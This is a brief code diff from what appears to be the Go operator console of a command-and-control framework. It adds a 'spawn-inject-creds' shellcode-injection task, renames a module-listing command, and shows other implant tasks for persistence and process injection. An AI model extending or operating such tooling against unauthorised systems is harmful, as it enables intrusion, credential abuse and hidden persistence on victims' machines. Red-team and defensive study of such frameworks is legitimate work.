@@ -747,6 +747,8 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareTaskWithArgs(c, clientId, command, "<pid> <RemotePath> <binaryArgs>: ")
 	case "create-process-creds":
 		PrepareTaskWithArgs(c, clientId, command, "<domain> <userName> <password> <binaryPath> <binaryArgs>: ")
+	case "spawn-inject-creds":
+		PrepareShellcodeTask(c, clientId, command, "<LocalFile> <domain> <userName> <password> <binaryPath> <binaryArgs>: ")
 	case "run-key":
 		PrepareTaskWithArgs(c, clientId, command, "<RunKeyName> <RunCommand>: ")
 	case "logon-script":
@@ -849,7 +851,7 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareShellcodeTask(c, clientId, command, "<Local PE to send> <exe,dll> <exportNameIfDLL>: ")
 	case "enum-drivers":
 		PrepareTaskSimple(c, clientId, command)
-	case "enum-modules":
+	case "list-library":
 		PrepareTaskWithOneArg(c, clientId, command, "<pid>: ")
 	case "enum-rwx-memory":
 		PrepareTaskSimple(c, clientId, command)
